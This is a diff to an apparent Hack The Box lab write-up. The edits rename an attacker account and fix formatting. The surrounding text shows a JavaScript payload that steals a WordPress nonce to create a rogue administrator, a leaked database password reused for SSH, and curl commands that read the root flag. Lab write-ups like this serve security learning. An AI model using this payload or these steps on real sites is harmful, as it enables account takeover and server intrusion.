@@ -22,8 +22,8 @@ fetch('/wp-admin/user-new.php', {credentials: 'include'})
     p.set('action', 'createuser');
     p.set('_wpnonce_create-user', n);
     p.set('_wp_http_referer', '/wp-admin/user-new.php');
-    p.set('user_login', 'stormk1n');
-    p.set('email', 'stormk1n@htb.htb');
+    p.set('user_login', 'admin2');
+    p.set('email', 'admin2@htb.htb');
     p.set('pass1', 'P@$$word1234!');
     p.set('pass2', 'P@$$word1234!');
     p.set('role', 'administrator');
@@ -43,7 +43,7 @@ fetch('/wp-admin/user-new.php', {credentials: 'include'})
 ```
 Once done, we submit a form with our payload as the message, and the other params filed as pleased. This should create an admin user with creds
 ```
-stormk1n: P@$$word1234!
+admin2: P@$$word1234!
 ```
 With admin access in a wordpress instance, we can easily gain command injection by modifying
 - A theme
@@ -76,7 +76,7 @@ define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
 define( 'DB_HOST', 'localhost' );
 ```
 
-## Initail Foothold
+## Initial Foothold
 
 Testing these creds against ssh grants us access to the lab machine.
 
@@ -133,13 +133,13 @@ curl -i -s -b c.txt -u 'walter:JbhHDAEgXvri3!' \
 ```
 
 ## Getting the flags
-**Root Flag**
+**Root Flag**<br>
 Now, reading it returns the value of /root/root.txt
 ```
 curl -s -u 'walter:JbhHDAEgXvri3!' http://localhost:8001/saved/rootflag.php
 ```
 
-**User Flag**
+**User Flag**<br>
 user flag stored in
 ```
 /home/walter/user.txt
